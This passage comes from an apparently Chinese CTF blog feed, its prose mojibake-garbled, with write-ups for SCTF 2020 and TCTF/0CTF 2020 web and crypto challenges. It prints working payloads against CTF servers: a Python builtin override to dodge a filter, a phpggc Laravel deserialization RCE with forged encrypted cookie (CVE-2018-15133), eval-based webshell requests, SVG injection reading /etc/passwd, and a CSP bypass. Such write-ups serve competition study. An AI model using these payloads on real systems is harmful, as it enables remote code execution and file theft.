href="https://imagin.vip/?p=1489#pysandbox2">https://imagin.vip/?p=1489#pysandbox2</a>ã€‚</p><p><code>__builtins__.__dict__[â€˜ordâ€™]</code>æ˜¯æˆ‘ä»¬æ­£å¸¸ä½¿ç”¨çš„ ordï¼ŒæŠŠè¿™ä¸ªå‡½æ•°æ”¹æˆä¸€ä¸ªè¿”å›æ’å®šå€¼çš„ï¼Œå°±å¯ä»¥æ— è§† waf äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;ord&#x27;</span>] = <span class="keyword">lambda</span> args:<span class="number">42</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿‡æ»¤äº†ç©ºæ ¼å’Œå¼•å·ï¼Œç©ºæ ¼å¯ä»¥ç”¨ *args ä»£æ›¿ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">ord</span>=<span class="keyword">lambda</span>*args:<span class="number">42</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ âš™ î‚° ~ î‚° python3</span><br><span class="line">Python 3.7.4 (default, Jul  9 2019, 18:13:23)</span><br><span class="line">[Clang 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; __builtins__.ord=lambda*args:42</span><br><span class="line">&gt;&gt;&gt; ord(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">42</span><br><span class="line">&gt;&gt;&gt; ord(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">42</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shelläº†ã€‚</p><h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><p>è¿™ä¸ªé¢˜è¢«éé¢„æœŸäº†ï¼Œé¢˜ç›®ä»£ç æ ¹æœ¬æ²¡ç”¨ï¼ŒLarval ç‰ˆæœ¬æ˜¯ 5.5.39ï¼ŒCVE-2018-15133ï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/6533ï¼Œç›´æ¥æ‰“ã€‚">https://xz.aliyun.com/t/6533ï¼Œç›´æ¥æ‰“ã€‚</a></p><p>ä½¿ç”¨ <a href="*https://github.com/ambionics/phpggc*">phpggc</a>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpggc î‚° î‚  master î‚° php phpggc Laravel/RCE2 <span class="string">&#x27;system&#x27;</span> <span class="string">&#x27;cat /flag&#x27;</span>  -b</span><br><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjk6ImNhdCAvZmxhZyI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319fXM6ODoiACoAZXZlbnQiO3M6OToiY2F0IC9mbGFnIjt9</span><br></pre></td></tr></table></figure><p>ç…§ç€åŠ å¯†é€»è¾‘ï¼Œæ”¹æ”¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$plain = base64_decode(<span class="string">&quot;Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjk6ImNhdCAvZmxhZyI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319fXM6ODoiACoAZXZlbnQiO3M6OToiY2F0IC9mbGFnIjt9&quot;</span>);</span><br><span class="line">$key = base64_decode(<span class="string">&#x27;P5tGTBKV2clEGWCWD7L5fSrhi8sfnX/cmHdqzx/fpVo=&#x27;</span>);</span><br><span class="line">$iv = random_bytes(openssl_cipher_iv_length(<span class="string">&#x27;AES-256-CBC&#x27;</span>));</span><br><span class="line">$value = openssl_encrypt($plain, <span class="string">&#x27;AES-256-CBC&#x27;</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line">$iv = base64_encode($iv);</span><br><span class="line">$mac = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $iv . $value, $key);</span><br><span class="line">$json = json_encode(compact(<span class="string">&#x27;iv&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;mac&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> base64_encode($json);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> âš™ î‚° 2020 SCTF î‚° php CVE-2018-15133.php</span><br><span class="line">eyJpdiI6IjBKRmRRYWh2TVk2ZzdpRWhmTVVIa3c9PSIsInZhbHVlIjoiakxCTXJvVVNqZ3hKN1F1Q1VSd2gzZWZOSitTMXgzc2RZZDBiTGZlZkdOR2xKOExDWXY3M0E4alZBcnhnQWVTQjg0RmVvRjhVaHJnOFkrSUNMZXdrK1ZaSjVIVmNkbFwvRVRydWU5ajZxU3BuVm02ZFZUVXhuXC9BSmkyY0NGWG8xQkFjaHRycVcxeXowUTdVXC9nYUxvbFl4dlcwTmJGOCtoMktzM2dRWEM1NUgxekVwc2dWOFU3VXFuZUJsbWhKVDRmQjhhZ3F4WlwvVTQ4VGkwbm05c1lyeVRUbTJONFRsWFIxdU5SVFNWRENQeHB5SGcweWZPNmhtSlJCNnRMZVh6bDVnM3lNY0lMdmtaS01vUDlXcE9cL3M0QT09IiwibWFjIjoiYjJkYjcyNDU5NzVlYjlmOWQzNDk5YTgxODk3NzE3ZjI1NmI2YmMzNzI1Y2NjYmZjY2U0MDg1YTRiZDE2OWY1ZSJ9%</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-37e3a789ee7c49e3.png" alt="image.png"></p><p>é¢„æœŸè§£åœ¨è¿™é‡Œï¼š<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/bestlanguage/Write-up">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/bestlanguage/Write-up</a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>ç±»ä¼¼ 2019 HITCON Quals Not So Hard RSAï¼Œå‚è€ƒï¼š<a href="https://gist.github.com/hellman/383dd8cf6f753fff55b98cf424f2e94e">https://gist.github.com/hellman/383dd8cf6f753fff55b98cf424f2e94e</a>ï¼Œæ”¹æ”¹æ•°æ®è·‘è„šæœ¬å°±è¡Œäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> âš™ î‚° 2020 SCTF î‚° sage rsa.sage</span><br><span class="line">Bit sizes:</span><br><span class="line">[888, 888, 889]</span><br><span class="line">[383]</span><br><span class="line">[383, 381, 383]</span><br><span class="line">found d row 0 : d = 13860282398350628680055087179162874305179305701888441908415109881269396959367466997596402959289379090042646293889703</span><br><span class="line">b<span class="string">&#x27;SCTF&#123;673ff064da31c0d7aee56884b01a09&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 TCTF/0CTF éƒ¨åˆ†wp</title>
      <link href="/2020/06/29/2020-TCTF-0CTF/"/>
      <url>/2020/06/29/2020-TCTF-0CTF/</url>
      
        <content type="html"><![CDATA[<p>è·Ÿç€ TD æ‰“äº†ä¸€ä¸‹ TCTF &amp; 0CTFï¼ŒåŸºæœ¬0è¾“å‡ºorzï¼Œç»™ TD çš„å¤§ä½¬é€’ teaã€‚</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>å¼€å±€ä¸€ä¸ªwebshellï¼Œæœ‰ open_basedir ä¸ disable_functions é™åˆ¶ï¼Œæ™®é€šæ–¹æ³•éƒ½æ— æ³•ç»•è¿‡ã€‚</p><p>å¯ä»¥ç”¨ glob + DirectoryIterator åˆ—å‡ºæ ¹ç›®å½•ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?rh=%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%67%6d%6c%5d%29%3b</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: pwnable.org:19260</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 91</span><br><span class="line"></span><br><span class="line">gml=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var </span><br></pre></td></tr></table></figure><p>å‘ç° flag.h ä¸ flag.soï¼Œç»“åˆ phpinfo ä¸­å¼€å¯äº† FFIï¼Œåº”è¯¥æ˜¯ç”¨ FFI è°ƒç”¨ flag.so ä¸­çš„æ–¹æ³•ã€‚</p><p>å°è¯• FFI load flag.hï¼Œå¯ä»¥å‘ç°æ²¡æœ‰æŠ¥500ï¼Œè¯´æ˜æˆåŠŸåŠ è½½ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?rh=%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%67%6d%6c%5d%29%3b</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: pwnable.org:19260</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 39</span><br><span class="line"></span><br><span class="line">gml=$ffi = FFI::load(&quot;/flag.h&quot;);echo 1;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬æ— æ³•çŸ¥é“æœ‰ä»€ä¹ˆæ–¹æ³•ï¼Œæ–¹æ³•åæ˜¯ä»€ä¹ˆï¼Œä¹Ÿè¯»å–ä¸äº† flag.hï¼Œä¸€ç›´å¡åœ¨è¿™é‡Œã€‚é˜Ÿé‡Œå¤§ä½¬å¼€å§‹ leak å†…å­˜æ¥è·å–æ–¹æ³•åï¼Œç»“æœ leak å‡ºäº†æ–¹æ³•åï¼šflag_fUn3t1on_fFiï¼ˆæˆ‘ä¹Ÿä¸æ‡‚è¿™äº›çŸ¥è¯†ï¼‰ã€‚å¯ä»¥å‚è€ƒç™½æ³½çš„è„šæœ¬ï¼š<a href="https://www.4hou.com/posts/p7BQ">https://www.4hou.com/posts/p7BQ</a>ã€‚</p><p>ç„¶åç›´æ¥è°ƒç”¨å°±å¥½äº†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-05c9d6d459f6ccb8.png" alt="image.png"></p><p>å‘ç°å¾ˆå¤šé˜Ÿä¼åšå‡ºæ¥äº†â€¦ open_basedir ä¸­é—´åäº†ä¸€æ®µæ—¶é—´ï¼Œåº”è¯¥æ˜¯è¢«äººç»™æäº†ï¼Œå¤§å®¶éƒ½å»ç›´æ¥è¯»å– flag.h äº†ã€‚</p><p>çŒœæµ‹å¯èƒ½æœ‰äººæ‰“äº† supervisor çš„ php-fpm æ¥ getshellï¼Œè¿›è€Œæ”¹äº† open_basedirã€‚</p><h3 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h3><p>ä¸»åŠæ–¹ä¸ç”˜å¿ƒï¼Œæ¥äº†ä¸ªå¤ä»‡ç‰ˆï¼Œdisable_functions æ›´åŠ ä¸¥æ ¼äº†ï¼Œå¹¶ä¸”æ²¡æœ‰äº† supervisorã€‚</p><p>æˆ‘ä»¬ä¸Šä¸ªé¢˜çš„è§£æ³•åº”è¯¥æ˜¯é¢„æœŸè§£æ³•ï¼Œç›´æ¥åŸæ · leak ä¸€ä¸‹æ–¹æ³•åï¼Œä»…ä»…æ”¹äº†ä¸ªæ–¹æ³•åï¼Œç„¶ågetflagã€‚æ‰€ä»¥é¢˜å‡ºæ¥çš„æ—¶å€™æˆ‘ä»¬ç›´æ¥æŠŠé¢˜ç§’äº†23333ã€‚</p><p>ä»flagæ¥çœ‹ï¼Œå¥½åƒæ˜¯æœ‰äººæ‰“äº† php-fpmï¼Œå› ä¸ºflagå†…å®¹æ˜¯ you canâ€˜t use fpm now ä¹‹ç±»çš„ã€‚</p><h3 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h3><p>ä¸€ä¸ªèŠå¤©ç•Œé¢ï¼Œå¯ä»¥åŠ å†…å®¹ä¸è¡¨æƒ…ï¼Œå¯ä»¥æˆªå›¾ã€‚</p><p>åŠ ä¸ªè¡¨æƒ…ï¼Œçœ‹ä¸€ä¸‹å‘é€çš„åŒ…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure><p>è¡¨æƒ…æ˜¯ä¸­æ‹¬å·æ‰©èµ·æ¥çš„ï¼Œshare åæŸ¥çœ‹å›¾ç‰‡è·¯å¾„ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-159695623b905b1f.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;pwnable.org:5000&#x2F;image&#x2F;fRszcH&#x2F;png</span><br></pre></td></tr></table></figure><p>æŠŠpngæ”¹æˆhtmlï¼Œä¸æ”¯æŒã€‚æ”¹æˆ svgï¼Œå¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼ŒçŒœæµ‹è¿™é‡Œä½¿ç”¨imagemagickã€‚æ”¹æˆhtmä¹Ÿå¯ä»¥ï¼Œå…¶ä¸­è¡¨æƒ…å¤„ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-50c9f5c17987b9d4.png" alt="image.png"></p><p>å¯ä»¥é—­åˆå¼•å·è¿›è¡Œ xssï¼Œä½†æ˜¯ src å…³é”®å­—è¢«è¿‡æ»¤äº†ã€‚</p><p>å‚è€ƒ3æœˆç©ºæŒ‡é’ˆå…¬å¼€èµ›ï¼š<a href="https://mp.weixin.qq.com/s/rMh-hABCdGpYpGqtFFiKOA">https://mp.weixin.qq.com/s/rMh-hABCdGpYpGqtFFiKOA</a></p><p>ä½¿ç”¨ <code>xlink:href</code>è¯»æ–‡ä»¶ï¼Œæ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout\&quot;&#x2F;&gt;&lt;image href&#x3D;\&quot;text:&#x2F;etc&#x2F;passwd\&quot; width&#x3D;\&quot;1000\&quot; height&#x3D;\&quot;1000\&quot;&#x2F;&gt; ]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯»å– /etc/passwdï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-546148cd9acbbf6f.png" alt="image.png"></p><p>ç›²çŒœç›´æ¥è¯»å– /app/app.pyï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-60ec9cb04ada30dc.png" alt="image.png"></p><p>è®¿é—®ï¼š<a href="http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws">http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</a></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1404f82ce510e8ef.png" alt="image.png"></p><p>éœ€è¦ alert(1)ï¼Œä½†æ˜¯æœ‰cspï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ meta refreshè¿›è¡Œè·³è½¬ï¼Œmetaè¢«è¿‡æ»¤ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œæ„é€ ä»¥ä¸‹payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout\&quot;&#x2F;&gt;&lt;memetata http-equiv&#x3D;\&quot;refresh\&quot; content&#x3D;\&quot;0; url&#x3D;http:&#x2F;&#x2F;*****\&quot;&gt;&lt;&#x2F;memetata&gt;\&quot;]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-78de0f37e1b8b635.png" alt="image.png"></p><p>æœåŠ¡å™¨ä¸Šæ˜¯:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°è·¯å¾„ï¼Œæ¢æˆhtmåç¼€ï¼Œæäº¤ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6abbf2c7415b6841.png" alt="image.png"></p><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>åˆ†æé¢˜ç›®ï¼Œåˆå§‹è´¦æˆ· 30 ä¸ª coinï¼Œéœ€è¦ 99 ä¸ª coin ä¹° flagï¼ŒèŠ± 10 ä¸ªcoinä¹°å½©ç¥¨ï¼Œå¾—åˆ°çš„å›æŠ¥ä¸€èˆ¬å°äºç­‰äº 10 ä¸ªcoinã€‚</p><p>æµç¨‹å¤§ä½“å¦‚ä¸‹ï¼š</p><ol><li>ç™»é™†è´¦æˆ·ï¼Œè¿”å›api_tokenï¼›</li><li>ç‚¹å‡»ä¹°å½©ç¥¨ï¼Œå‘ <code>/lottery/buy</code> æ¥å£å‘é€ api_tokenï¼Œè¿”å› encï¼ˆåŠ å¯†çš„è®¢å•ä¿¡æ¯ï¼‰ã€‚</li><li>å‘ <code>/lottery/info</code> æ¥å£å‘é€ encï¼Œå¾—åˆ°è®¢å•ä¿¡æ¯ã€‚ï¼ˆlotteryçš„uuidï¼Œuserçš„uuidä»¥åŠå¾—åˆ°çš„coinï¼‰</li><li>ç‚¹å‡»chargeï¼Œå‘<code>/lottery/charge</code>æ¥å£å‘é€ userçš„uuidã€coinä»¥åŠencï¼ŒæœåŠ¡ç«¯å¯¹encè§£å¯†ï¼Œæ ¡éªŒ useruuidï¼Œæ— è¯¯æŠŠè§£å¯†å¾—åˆ°çš„coinåŠ åˆ°user uuid å¯¹åº”çš„userä¸Šã€‚</li></ol><p>åˆ†æå…³é”®çš„encï¼Œæ‹¿ä¸¤æ¬¡ buy å¾—åˆ°çš„encå¯¹æ¯”ï¼Œå‘ç°æ˜¯ 16 å­—èŠ‚ä¸€ç»„ï¼Œä¸€å…± 8 ç»„ï¼Œä¸­é—´è¿˜æœ‰ä¸€äº›ç»„å¯†æ–‡ç›¸åŒï¼Œä¸éš¾å¾—å‡ºåŠ å¯†æ¨¡å¼æ˜¯ AES ECBæ¨¡å¼ã€‚<code>/lottery/info</code>æ¥å£æä¾›äº† enc è§£å¯†çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¿æŒä¸€ä¸ªencä¸å˜ï¼Œå¦ä¸€ä¸ªencæ¯ä¸ªåˆ†ç»„åˆ†åˆ«æ›¿æ¢æˆä¸å˜çš„encå¯¹åº”çš„åˆ†ç»„ï¼Œä¾æ¬¡å¯¹æ¯”è§£å¯†ä¿¡æ¯çš„ä¸åŒï¼Œå¯ä»¥å‘ç°user uuidæ¶‰åŠå››ä¸ªåˆ†ç»„ï¼Œä»ç¬¬å››ä¸ªåˆ†ç»„åˆ°å€’æ•°ç¬¬äºŒä¸ªåˆ†ç»„ã€‚</p><p>ä»¥ uuid ä¸º 390e0a78-49ff-4264-8ddd-8b902319d189 ä¸ºä¾‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬å››ç»„ï¼š xxxxxxxxxxxxxx39</span><br><span class="line">ç¬¬äº”ç»„ï¼š 0e0a78-49ff-4264</span><br><span class="line">ç¬¬å…­ç»„ï¼š -8ddd-8b902319d1</span><br><span class="line">ç¬¬ä¸ƒç»„ï¼š 89xxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æœ‰ä¸€ä¸ªè´¦æˆ·Aï¼Œå¯ä»¥æ­£å¸¸ä¹°å½©ç¥¨ï¼Œå¦‚æœæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªuuid å‰ä¸¤ä½å’Œåä¸¤ä½ä¸è´¦æˆ·Aç›¸åŒçš„è´¦æˆ·Bï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨è´¦æˆ·B buy å½©ç¥¨ï¼Œå¾—åˆ° enc åæŠŠchargeå¾—é’±çš„è´¦æˆ·æ”¹æˆè´¦æˆ·Aï¼ˆæŠŠencç¬¬äº”ç»„ä¸ç¬¬å…­ç»„æ›¿æ¢æˆè´¦æˆ·Açš„å¯†æ–‡ï¼‰ï¼Œè¿™æ ·å°±æŠŠå¾—åˆ°çš„é’±è½¬åˆ°Aä¸Šäº†ï¼Œå¹¶ä¸”ä¹°å½©ç¥¨ç”¨çš„æ˜¯Bè´¦æˆ·çš„coinã€‚å¤šæ‰¾å‡ ä¸ªè¿™æ ·çš„è´¦æˆ·Bï¼ŒæŠŠé’±éƒ½è½¬åˆ°è´¦æˆ·Aä¸Šï¼Œå°±å¯ä»¥å¾—åˆ°99ä¸ªcoinäº†ã€‚</p><p>æˆ‘ä»¬éœ€è¦çˆ†ç ´ä¸€å † uuid çš„å‰ä¸¤ä½å’Œåä¸¤ä½éƒ½ä¸€æ ·çš„è´¦æˆ·ï¼Œç„¶åæŠŠè½¬åˆ°ä¸€ä¸ªè´¦æˆ·ä¸Šã€‚è¿æ°”å¥½çš„è¯å¤§æ¦‚éœ€è¦çˆ†äº”å…­ä¸ªè¿™æ ·çš„è´¦æˆ·ã€‚</p><p>çˆ†ç ´å¾ˆæ…¢â€¦ é‡‡ç”¨å¤šè¿›ç¨‹æ–¹å¼ï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, Manager, Value</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params"><span class="built_in">dict</span>, now_num</span>):</span></span><br><span class="line">    user = <span class="string">&quot;&quot;</span>.join([random.choice(string.printable) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)])</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: user, <span class="string">&quot;username&quot;</span>: user&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://pwnable.org:2333&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, 